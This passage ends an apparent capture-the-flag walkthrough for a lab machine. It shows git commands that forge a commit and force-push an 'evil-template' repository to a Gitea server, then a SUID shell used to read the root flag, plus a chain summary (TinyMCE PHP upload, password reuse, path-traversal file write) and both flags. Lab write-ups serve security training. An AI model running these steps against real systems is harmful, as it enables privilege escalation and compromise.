commit=$(printf 'pwn\n' | git commit-tree "$t")
git update-ref refs/heads/main "$commit"

git ls-tree -r main
```

## Push to Template Repo

```bash
git remote remove origin 2>/dev/null
git remote add origin http://git.nexus.htb/jones/evil-template.git
git push -u origin main --force
```

## Root

```bash
/tmp/rootbash -p
id
cat /root/root.txt
```

---

# 22. Final Result

```text
Foothold: www-data via Krayin TinyMCE PHP upload
User:     jones via password reuse
Root:     path traversal arbitrary file write in root Gitea template sync job
```

Flags:

```text
user.txt: 347eede9407e77af48adea30ab6ec9b5
root.txt: 58fd3ff233ccbf297022ef0dc9b5d4ec
```
